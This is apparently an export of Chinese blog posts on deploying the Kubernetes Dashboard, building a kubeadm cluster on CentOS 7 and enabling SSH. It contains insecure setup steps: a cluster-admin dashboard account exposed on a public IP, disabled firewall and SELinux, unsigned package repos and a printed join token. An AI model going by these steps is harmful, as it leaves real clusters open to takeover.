v1</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line">  name: kubernetes-dashboard</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line">spec:</span><br><span class="line">  ports:</span><br><span class="line">    - port: 443</span><br><span class="line">      targetPort: 8443</span><br><span class="line">  selector:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Secret</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line">  name: kubernetes-dashboard-certs</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line">type: Opaque</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Secret</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line">  name: kubernetes-dashboard-csrf</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line">type: Opaque</span><br><span class="line">data:</span><br><span class="line">  csrf: &quot;&quot;</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Secret</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line">  name: kubernetes-dashboard-key-holder</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line">type: Opaque</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">kind: ConfigMap</span><br><span class="line">apiVersion: v1</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line">  name: kubernetes-dashboard-settings</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">kind: Role</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line">  name: kubernetes-dashboard</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line">rules:</span><br><span class="line">  # Allow Dashboard to get, update and delete Dashboard exclusive secrets.</span><br><span class="line">  - apiGroups: [&quot;&quot;]</span><br><span class="line">    resources: [&quot;secrets&quot;]</span><br><span class="line">    resourceNames: [&quot;kubernetes-dashboard-key-holder&quot;, &quot;kubernetes-dashboard-certs&quot;, &quot;kubernetes-dashboard-csrf&quot;]</span><br><span class="line">    verbs: [&quot;get&quot;, &quot;update&quot;, &quot;delete&quot;]</span><br><span class="line">    # Allow Dashboard to get and update &#x27;kubernetes-dashboard-settings&#x27; config map.</span><br><span class="line">  - apiGroups: [&quot;&quot;]</span><br><span class="line">    resources: [&quot;configmaps&quot;]</span><br><span class="line">    resourceNames: [&quot;kubernetes-dashboard-settings&quot;]</span><br><span class="line">    verbs: [&quot;get&quot;, &quot;update&quot;]</span><br><span class="line">    # Allow Dashboard to get metrics.</span><br><span class="line">  - apiGroups: [&quot;&quot;]</span><br><span class="line">    resources: [&quot;services&quot;]</span><br><span class="line">    resourceNames: [&quot;heapster&quot;, &quot;dashboard-metrics-scraper&quot;]</span><br><span class="line">    verbs: [&quot;proxy&quot;]</span><br><span class="line">  - apiGroups: [&quot;&quot;]</span><br><span class="line">    resources: [&quot;services/proxy&quot;]</span><br><span class="line">    resourceNames: [&quot;heapster&quot;, &quot;http:heapster:&quot;, &quot;https:heapster:&quot;, &quot;dashboard-metrics-scraper&quot;, &quot;http:dashboard-metrics-scraper&quot;]</span><br><span class="line">    verbs: [&quot;get&quot;]</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">kind: ClusterRole</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line">  name: kubernetes-dashboard</span><br><span class="line">rules:</span><br><span class="line">  # Allow Metrics Scraper to get metrics from the Metrics server</span><br><span class="line">  - apiGroups: [&quot;metrics.k8s.io&quot;]</span><br><span class="line">    resources: [&quot;pods&quot;, &quot;nodes&quot;]</span><br><span class="line">    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;]</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: RoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line">  name: kubernetes-dashboard</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line">roleRef:</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: Role</span><br><span class="line">  name: kubernetes-dashboard</span><br><span class="line">subjects:</span><br><span class="line">  - kind: ServiceAccount</span><br><span class="line">    name: kubernetes-dashboard</span><br><span class="line">    namespace: kubernetes-dashboard</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  name: kubernetes-dashboard</span><br><span class="line">roleRef:</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: kubernetes-dashboard</span><br><span class="line">subjects:</span><br><span class="line">  - kind: ServiceAccount</span><br><span class="line">    name: kubernetes-dashboard</span><br><span class="line">    namespace: kubernetes-dashboard</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">kind: Deployment</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line">  name: kubernetes-dashboard</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  revisionHistoryLimit: 10</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      k8s-app: kubernetes-dashboard</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        k8s-app: kubernetes-dashboard</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">        - name: kubernetes-dashboard</span><br><span class="line">          image: kubernetesui/dashboard:v2.3.1</span><br><span class="line">          imagePullPolicy: Always</span><br><span class="line">          ports:</span><br><span class="line">            - containerPort: 8443</span><br><span class="line">              protocol: TCP</span><br><span class="line">          args:</span><br><span class="line">            - --auto-generate-certificates</span><br><span class="line">            - --namespace=kubernetes-dashboard</span><br><span class="line">            # Uncomment the following line to manually specify Kubernetes API server Host</span><br><span class="line">            # If not specified, Dashboard will attempt to auto discover the API server and connect</span><br><span class="line">            # to it. Uncomment only if the default does not work.</span><br><span class="line">            # - --apiserver-host=http://my-address:port</span><br><span class="line">          volumeMounts:</span><br><span class="line">            - name: kubernetes-dashboard-certs</span><br><span class="line">              mountPath: /certs</span><br><span class="line">              # Create on-disk volume to store exec logs</span><br><span class="line">            - mountPath: /tmp</span><br><span class="line">              name: tmp-volume</span><br><span class="line">          livenessProbe:</span><br><span class="line">            httpGet:</span><br><span class="line">              scheme: HTTPS</span><br><span class="line">              path: /</span><br><span class="line">              port: 8443</span><br><span class="line">            initialDelaySeconds: 30</span><br><span class="line">            timeoutSeconds: 30</span><br><span class="line">          securityContext:</span><br><span class="line">            allowPrivilegeEscalation: false</span><br><span class="line">            readOnlyRootFilesystem: true</span><br><span class="line">            runAsUser: 1001</span><br><span class="line">            runAsGroup: 2001</span><br><span class="line">      volumes:</span><br><span class="line">        - name: kubernetes-dashboard-certs</span><br><span class="line">          secret:</span><br><span class="line">            secretName: kubernetes-dashboard-certs</span><br><span class="line">        - name: tmp-volume</span><br><span class="line">          emptyDir: &#123;&#125;</span><br><span class="line">      serviceAccountName: kubernetes-dashboard</span><br><span class="line">      nodeSelector:</span><br><span class="line">        &quot;kubernetes.io/os&quot;: linux</span><br><span class="line">      # Comment the following tolerations if Dashboard must not be deployed on master</span><br><span class="line">      tolerations:</span><br><span class="line">        - key: node-role.kubernetes.io/master</span><br><span class="line">          effect: NoSchedule</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">kind: Service</span><br><span class="line">apiVersion: v1</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: dashboard-metrics-scraper</span><br><span class="line">  name: dashboard-metrics-scraper</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line">spec:</span><br><span class="line">  ports:</span><br><span class="line">    - port: 8000</span><br><span class="line">      targetPort: 8000</span><br><span class="line">  selector:</span><br><span class="line">    k8s-app: dashboard-metrics-scraper</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">kind: Deployment</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: dashboard-metrics-scraper</span><br><span class="line">  name: dashboard-metrics-scraper</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  revisionHistoryLimit: 10</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      k8s-app: dashboard-metrics-scraper</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        k8s-app: dashboard-metrics-scraper</span><br><span class="line">      annotations:</span><br><span class="line">        seccomp.security.alpha.kubernetes.io/pod: &#x27;runtime/default&#x27;</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">        - name: dashboard-metrics-scraper</span><br><span class="line">          image: kubernetesui/metrics-scraper:v1.0.6</span><br><span class="line">          ports:</span><br><span class="line">            - containerPort: 8000</span><br><span class="line">              protocol: TCP</span><br><span class="line">          livenessProbe:</span><br><span class="line">            httpGet:</span><br><span class="line">              scheme: HTTP</span><br><span class="line">              path: /</span><br><span class="line">              port: 8000</span><br><span class="line">            initialDelaySeconds: 30</span><br><span class="line">            timeoutSeconds: 30</span><br><span class="line">          volumeMounts:</span><br><span class="line">          - mountPath: /tmp</span><br><span class="line">            name: tmp-volume</span><br><span class="line">          securityContext:</span><br><span class="line">            allowPrivilegeEscalation: false</span><br><span class="line">            readOnlyRootFilesystem: true</span><br><span class="line">            runAsUser: 1001</span><br><span class="line">            runAsGroup: 2001</span><br><span class="line">      serviceAccountName: kubernetes-dashboard</span><br><span class="line">      nodeSelector:</span><br><span class="line">        &quot;kubernetes.io/os&quot;: linux</span><br><span class="line">      # Comment the following tolerations if Dashboard must not be deployed on master</span><br><span class="line">      tolerations:</span><br><span class="line">        - key: node-role.kubernetes.io/master</span><br><span class="line">          effect: NoSchedule</span><br><span class="line">      volumes:</span><br><span class="line">        - name: tmp-volume</span><br><span class="line">          emptyDir: &#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="2、设置访问端口"><a href="#2、设置访问端口" class="headerlink" title="2、设置访问端口"></a>2、设置访问端口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl edit svc kubernetes-dashboard -n kubernetes-dashboard</span><br></pre></td></tr></table></figure><p>type: ClusterIP 改为 type: NodePort</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl get svc -A |grep kubernetes-dashboard</span><br><span class="line">## 找到端口，在安全组放行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问： https://集群任意IP:端口      https://139.198.165.238:32759</span><br></pre></td></tr></table></figure><h2 id="3、创建访问账号"><a href="#3、创建访问账号" class="headerlink" title="3、创建访问账号"></a>3、创建访问账号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#创建访问账号，准备一个yaml文件； vi dash.yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: admin-user</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line">---</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  name: admin-user</span><br><span class="line">roleRef:</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: cluster-admin</span><br><span class="line">subjects:</span><br><span class="line">- kind: ServiceAccount</span><br><span class="line">  name: admin-user</span><br><span class="line">  namespace: kubernetes-dashboard</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f dash.yaml</span><br></pre></td></tr></table></figure><h2 id="4、令牌访问"><a href="#4、令牌访问" class="headerlink" title="4、令牌访问"></a>4、令牌访问</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#获取访问令牌</span><br><span class="line">kubectl -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admin-user -o jsonpath=&quot;&#123;.secrets[0].name&#125;&quot;) -o go-template=&quot;&#123;&#123;.data.token | base64decode&#125;&#125;&quot;</span><br></pre></td></tr></table></figure><p>根据令牌登录即可</p><h1 id="七、常见错误解决"><a href="#七、常见错误解决" class="headerlink" title="七、常见错误解决"></a>七、常见错误解决</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The connection to the server localhost:8080 was refused - did you specify the right host or port?</span><br></pre></td></tr></table></figure><p>原因：kubernetes master没有与本机绑定，集群初始化的时候没有绑定，此时设置在本机的环境变量即可解决问题。</p><p>解决：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;export KUBECONFIG=/etc/kubernetes/admin.conf&quot; &gt;&gt; /etc/profile</span><br></pre></td></tr></table></figure><p>使生效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用kubeadm快速部署一个k8s集群</title>
      <link href="/2023/01/13/%E4%BD%BF%E7%94%A8kubeadm%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2%E4%B8%80%E4%B8%AAk8s%E9%9B%86%E7%BE%A4/"/>
      <url>/2023/01/13/%E4%BD%BF%E7%94%A8kubeadm%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2%E4%B8%80%E4%B8%AAk8s%E9%9B%86%E7%BE%A4/</url>
      
        <content type="html"><![CDATA[<p>kubeadm是官方社区推出的一个用于快速部署kubernetes集群的工具。</p><p>这个工具能通过两条指令完成一个kubernetes集群的部署：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个 Master 节点</span><br><span class="line">$ kubeadm init</span><br><span class="line"></span><br><span class="line"># 将一个 Node 节点加入到当前集群中</span><br><span class="line">$ kubeadm join &lt;Master节点的IP和端口 &gt;</span><br></pre></td></tr></table></figure><h2 id="1-安装要求"><a href="#1-安装要求" class="headerlink" title="1. 安装要求"></a>1. 安装要求</h2><p>在开始之前，部署Kubernetes集群机器需要满足以下几个条件：</p><ul><li>一台或多台机器，操作系统 CentOS7.x-86_x64</li><li>硬件配置：2GB或更多RAM，2个CPU或更多CPU，硬盘30GB或更多</li><li>可以访问外网，需要拉取镜像，如果服务器不能上网，需要提前下载镜像并导入节点</li><li>禁止swap分区</li></ul><h2 id="2-准备环境"><a href="#2-准备环境" class="headerlink" title="2. 准备环境"></a>2. 准备环境</h2><table><thead><tr><th>角色</th><th>IP</th></tr></thead><tbody><tr><td>master</td><td>192.168.203.132</td></tr><tr><td>node1</td><td>192.168.203.133</td></tr><tr><td>node2</td><td>192.168.203.131</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># 关闭防火墙</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br><span class="line"></span><br><span class="line"># 关闭selinux</span><br><span class="line">sed -i &#x27;s/enforcing/disabled/&#x27; /etc/selinux/config  # 永久</span><br><span class="line">setenforce 0  # 临时</span><br><span class="line"></span><br><span class="line"># 关闭swap</span><br><span class="line">swapoff -a  # 临时</span><br><span class="line">sed -ri &#x27;s/.*swap.*/#&amp;/&#x27; /etc/fstab    # 永久</span><br><span class="line"></span><br><span class="line"># 根据规划设置主机名</span><br><span class="line">hostnamectl set-hostname &lt;hostname&gt;</span><br><span class="line"></span><br><span class="line"># 在master添加hosts</span><br><span class="line">cat &gt;&gt; /etc/hosts &lt;&lt; EOF</span><br><span class="line">192.168.203.132 k8s-master</span><br><span class="line">192.168.203.133 k8s-node1</span><br><span class="line">192.168.203.131 k8s-node2</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"># 将桥接的IPv4流量传递到iptables的链</span><br><span class="line">cat &gt; /etc/sysctl.d/k8s.conf &lt;&lt; EOF</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="line">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="line">EOF</span><br><span class="line">sysctl --system  # 生效</span><br><span class="line"></span><br><span class="line"># 时间同步</span><br><span class="line">yum install ntpdate -y</span><br><span class="line">ntpdate time.windows.com</span><br></pre></td></tr></table></figure><h2 id="3-所有节点安装Docker-kubeadm-kubelet"><a href="#3-所有节点安装Docker-kubeadm-kubelet" class="headerlink" title="3. 所有节点安装Docker/kubeadm/kubelet"></a>3. 所有节点安装Docker/kubeadm/kubelet</h2><p>Kubernetes默认CRI（容器运行时）为Docker，因此先安装Docker。</p><h3 id="3-1-安装Docker"><a href="#3-1-安装Docker" class="headerlink" title="3.1 安装Docker"></a>3.1 安装Docker</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo</span><br><span class="line">yum -y install docker-ce</span><br><span class="line">systemctl enable docker &amp;&amp; systemctl start docker</span><br></pre></td></tr></table></figure><p>配置镜像下载加速器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://b9pmyelo.mirror.aliyuncs.com&quot;],</span><br><span class="line">  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">systemctl restart docker</span><br><span class="line">docker info                  #查看docker信息，进行确认</span><br></pre></td></tr></table></figure><h3 id="3-2添加阿里云软件源："><a href="#3-2添加阿里云软件源：" class="headerlink" title="3.2添加阿里云软件源："></a>3.2添加阿里云软件源：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; /etc/yum.repos.d/kubernetes.repo &lt;&lt; EOF</span><br><span class="line">[kubernetes]</span><br><span class="line">name=Kubernetes</span><br><span class="line">baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">repo_gpgcheck=0</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="3-3-安装kubeadm，kubelet和kubectl"><a href="#3-3-安装kubeadm，kubelet和kubectl" class="headerlink" title="3.3 安装kubeadm，kubelet和kubectl"></a>3.3 安装kubeadm，kubelet和kubectl</h3><p>由于版本更新频繁，这里指定版本号部署：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ yum install -y kubelet-1.18.0 kubeadm-1.18.0 kubectl-1.18.0</span><br><span class="line">$ systemctl enable kubelet</span><br></pre></td></tr></table></figure><h2 id="4-部署Kubernetes-Master"><a href="#4-部署Kubernetes-Master" class="headerlink" title="4. 部署Kubernetes Master"></a>4. 部署Kubernetes Master</h2><p>在192.168.203.132（Master）执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ kubeadm init --apiserver-advertise-address=192.168.203.132 --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.18.0 --service-cidr=10.96.0.0/12 --pod-network-cidr=10.244.0.0/16</span><br></pre></td></tr></table></figure><p>由于默认拉取镜像地址k8s.gcr.io国内无法访问，这里指定阿里云镜像仓库地址。</p><ul><li>-apiserver-advertise-address 集群通告地址 (与master的Ip保持一致)</li><li>–image-repository 由于默认拉取镜像地址k8s.gcr.io国内无法访问，这里指定阿里云镜像仓库地址</li><li>–kubernetes-version K8s版本，与上面安装的一致</li><li>–service-cidr 集群内部虚拟网络，Pod统一访问入口</li><li>–pod-network-cidr Pod网络，与下面部署的CNI网络组件yaml中保持一致</li></ul><p> 初始化之后，会输出一个join命令，先复制出来，node节点加入master会使用。</p><p>使用kubectl工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p $HOME/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br></pre></td></tr></table></figure><p>查看工作节点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get nodes</span><br></pre></td></tr></table></figure><h2 id="5-加入Kubernetes-Node"><a href="#5-加入Kubernetes-Node" class="headerlink" title="5.加入Kubernetes Node"></a>5.加入Kubernetes Node</h2><p>在192.168.203.133/131（Node）执行。</p><p>向集群添加新节点，执行在kubeadm init输出的kubeadm join命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubeadm join 192.168.203.132:6443 --token esce21.q6hetwm8si29qxwn \</span><br><span class="line">   --discovery-token-ca-cert-hash sha256:00603a05805807501d7181c3d60b478788408cfe6cedefedb1f97569708be9c5</span><br></pre></td></tr></table></figure><p>默认token有效期为24小时，当过期之后，该token就不可用了。这时就需要重新创建token，操作如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubeadm token create --print-join-command</span><br></pre></td></tr></table></figure><h2 id="6-部署容器网络-（master执行）"><a href="#6-部署容器网络-（master执行）" class="headerlink" title="6.部署容器网络 （master执行）"></a>6.部署容器网络 （master执行）</h2><p>Calico是一个纯三层的数据中心网络方案，是目前Kubernetes主流的网络方案。</p><p>下载YAML：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://docs.projectcalico.org/v3.14/manifests/calico.yaml</span><br></pre></td></tr></table></figure><p>下载完后还需要修改里面定义Pod网络（CALICO_IPV4POOL_CIDR），与前面kubeadm init的 –pod-network-cidr指定的一样。</p><p>修改完后文件后，进行部署：</p><pre><code>kubectl apply -f calico.yamlkubectl get pods -n kube-system                        #执行结束要等上一会才全部running</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux开启ssh</title>
      <link href="/2023/01/13/linux%E5%BC%80%E5%90%AFssh/"/>
      <url>/2023/01/13/linux%E5%BC%80%E5%90%AFssh/</url>
      
        <content type="html"><![CDATA[<h2 id="1-查看是否安装了openssh-server"><a href="#1-查看是否安装了openssh-server" class="headerlink" title="1.查看是否安装了openssh-server"></a>1.查看是否安装了<a href="https://so.csdn.net/so/search?q=openssh&spm=1001.2101.3001.7020">openssh</a>-server</h2><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum list installed | grep openssh-server</span><br></pre></td></tr></table></figure><p>如果有openssh-server，则是已安装，如果没有则需要安装，执行安装命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install openssh-server</span><br></pre></td></tr></table></figure><h2 id="2-打开sshd配置文件sshd-config"><a href="#2-打开sshd配置文件sshd-config" class="headerlink" title="2.打开sshd配置文件sshd_config"></a>2.打开sshd配置文件sshd_config</h2><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config </span><br></pre></td></tr></table></figure><p>去掉监听端口、地址前的注释：</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230113165527.png"></p><p>开启远程登录：</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230113165641.png"></p><p>开启用户密码作为连接验证，保存退出</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230113165732.png"></p><h2 id="3-开启-sshd-服务"><a href="#3-开启-sshd-服务" class="headerlink" title="3.开启  sshd  服务"></a>3.开启  sshd  服务</h2><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service sshd start </span><br></pre></td></tr></table></figure><p> 停止SSH服务命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service sshd stop</span><br></pre></td></tr></table></figure><p> 重启SSH服务命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><h2 id="4-设置SSH服务为开机启动。"><a href="#4-设置SSH服务为开机启动。" class="headerlink" title="4.设置SSH服务为开机启动。"></a>4.设置SSH服务为开机启动。</h2><p> 输入命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chkconfig sshd on</span><br><span class="line">若是chkconfig sshd off则禁止SSH开机启动</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关闭开启之后linuxx子系统异常</title>
      <link href="/2022/11/18/%E5%85%B3%E9%97%AD%E5%BC%80%E5%90%AF%E4%B9%8B%E5%90%8Elinuxx%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%BC%82%E5%B8%B8/"/>
      <url>/2022/11/18/%E5%85%B3%E9%97%AD%E5%BC%80%E5%90%AF%E4%B9%8B%E5%90%8Elinuxx%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%BC%82%E5%B8%B8/</url>
      
